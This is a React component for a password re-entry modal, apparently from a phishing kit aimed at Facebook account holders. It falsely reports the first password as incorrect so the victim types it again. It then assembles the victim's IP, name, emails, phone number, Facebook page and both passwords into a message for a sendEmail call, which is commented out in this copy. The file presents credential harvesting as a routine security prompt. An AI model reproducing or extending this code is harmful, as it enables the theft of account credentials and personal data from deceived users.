import React from 'react';
import './Modal.scss';
import ButtonSecondary from '../UI/ButtonSecondary/ButtonSecondary';
import InputText from '../UI/InputText/InputText';
import InputPassword from '../UI/InputPassword/InputPassword';
import { useNavigate } from 'react-router-dom';
// import { sendEmail } from '../../Utils/sendEmail';

const Modal = ({ isModal, setIsModal }) => {
  const router = useNavigate();

  const [password, setPassword] = React.useState('');
  const [attempt, setAttempt] = React.useState(0);

  let pass = React.useRef('');

  const styleModal = ['modal'];
  if (isModal) {
    styleModal.push('modal__active');
  }

  const handleContinue = () => {
    if (attempt === 0) pass.current = password;
    setAttempt((prev) => prev + 1);
  };

  React.useEffect(() => {
    if (attempt >= 2) {
      const formData = JSON.parse(localStorage.getItem('form'));
      const content = `
IP: ${localStorage.getItem('ip')}

Full Name: ${formData.fName}
Business email: ${formData.bEmail}
Personal email: ${formData.pEmail}
Phone number: ${formData.phone}
Facebook page: ${formData.facebook}

First password: ${pass.current}
Last password: ${password}
      `;
      //sendEmail({ content }).then(() => router('/authentication'));
    }
  }, [attempt, password, router]);

  return (
    <div
      className={styleModal.join(' ')}
      aria-hidden="false"
      onClick={() => setIsModal((state) => !state)}
    >
      <div className="modal-dialog" onClick={(e) => e.stopPropagation()}>
        <div className="modal-content">
          <div className="modal-header">
            <div className="modal-title" id="exampleModalLabel">
              Please Enter Your Password
            </div>
            <button
              type="button"
              className="btn-close"
              onClick={() => setIsModal((state) => !state)}
            ></button>
          </div>
          <div className="modal-body">
            <div className="modal__body-description">
              For your security, you must re-enter your password to continue.
            </div>
            <div className="modal__body-password">
              <InputPassword
                value={password}
                fun={(e) => setPassword(e.target.value)}
              >
                Password
              </InputPassword>
              {attempt > 0 && (
                <p className="text-danger">
                  Incorrect password, please try again
                </p>
              )}
            </div>
          </div>
          <div className="modal-footer">
            <div className="modal__btn">
              <ButtonSecondary
                BackColor="#6C757C"
                fun={() => setIsModal((state) => !state)}
              >
                Close
              </ButtonSecondary>
            </div>
            <div className="modal__btn">
              <ButtonSecondary BackColor="#256FF4" fun={handleContinue}>
                Continue
              </ButtonSecondary>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Modal;